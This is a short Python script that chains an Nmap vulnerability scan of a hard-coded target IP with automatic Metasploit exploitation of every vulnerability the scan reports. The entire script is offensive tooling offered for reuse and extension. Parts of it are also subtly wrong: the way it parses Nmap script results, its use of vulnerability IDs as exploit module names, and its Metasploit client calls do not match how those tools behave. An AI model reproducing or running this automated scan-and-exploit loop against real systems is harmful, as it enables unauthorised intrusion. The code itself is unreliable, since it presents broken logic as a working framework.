#This script provides a basic framework for automating the vulnerability scanning and exploitation process using Nmap and Metasploit. You can further enhance it by handling more complex scenarios, integrating with other tools, and customizing it to fit your specific requirements.





import nmap
import time
from metasploit.msfrpc import MsfRpcClient

# Initialize Nmap scanner
nm = nmap.PortScanner()

# Scan the target host
target_host = "192.168.1.100"
nm.scan(target_host, arguments="-sV --script vuln")

# Parse the scan results
for host in nm.all_hosts():
    print(f"Host: {host}")
    for port in nm[host]["tcp"]:
        print(f"Port: {port}")
        for key, value in nm[host]["tcp"][port].items():
            print(f"{key}: {value}")
        if "script" in nm[host]["tcp"][port]:
            for script in nm[host]["tcp"][port]["script"]:
                if script == "vuln":
                    for vuln_id, vuln_info in nm[host]["tcp"][port]["script"]["vuln"].items():
                        print(f"Vulnerability: {vuln_id}")
                        print(f"Description: {vuln_info['description']}")

# Initialize Metasploit RPC client
client = MsfRpcClient("password")

# Exploit identified vulnerabilities
for host in nm.all_hosts():
    for port in nm[host]["tcp"]:
        if "script" in nm[host]["tcp"][port]:
            for script in nm[host]["tcp"][port]["script"]:
                if script == "vuln":
                    for vuln_id, vuln_info in nm[host]["tcp"][port]["script"]["vuln"].items():
                        exploit_module = client.modules.use("exploit", vuln_id)
                        exploit_module.run(target_host=host, target_port=port)
                        time.sleep(5)  # Wait for exploitation to complete

# Close the Metasploit RPC client
client.close()
